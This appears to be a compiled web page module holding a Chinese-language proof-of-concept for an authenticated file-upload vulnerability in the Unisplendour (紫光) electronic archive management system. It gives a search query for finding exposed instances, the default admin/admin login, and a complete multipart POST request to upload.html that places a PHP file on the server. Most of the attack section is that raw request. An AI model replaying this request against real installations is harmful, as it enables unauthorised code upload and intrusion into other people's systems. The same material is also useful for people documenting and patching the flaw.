import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{o as e,c as n,e as a}from"./app-58e4a7d6.js";const d={},t=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统后台存在文件上传漏洞。攻击者可利用漏洞获取数据库敏感信息。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>紫光电子档案管理系统
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;紫光档案管理系统&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084520184.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用默认口令登录后台 admin/admin, 发送请求包</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084534337.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 614
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIRYWNxmDYiZBguT

------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name=&quot;userID&quot;

admin
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name=&quot;fondsid&quot;

1
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name=&quot;comid&quot;

1
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name=&quot;token&quot;

6b79a77180e9ec3a7ca351ebe54641a2
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name=&quot;files[]&quot;; filename=&quot;phpinfo.php&quot;
Content-Type: text/php

&lt;?php phpinfo();?&gt;
------WebKitFormBoundarygIRYWNxmDYiZBguT--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084553654.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>回显路径即为上传成功的文件路径</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314084608438.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),s=[t];function l(r,o){return e(),n("div",null,s)}const m=i(d,[["render",l],["__file","紫光档案管理系统 upload.html 后台文件上传漏洞.html.vue"]]);export{m as default};
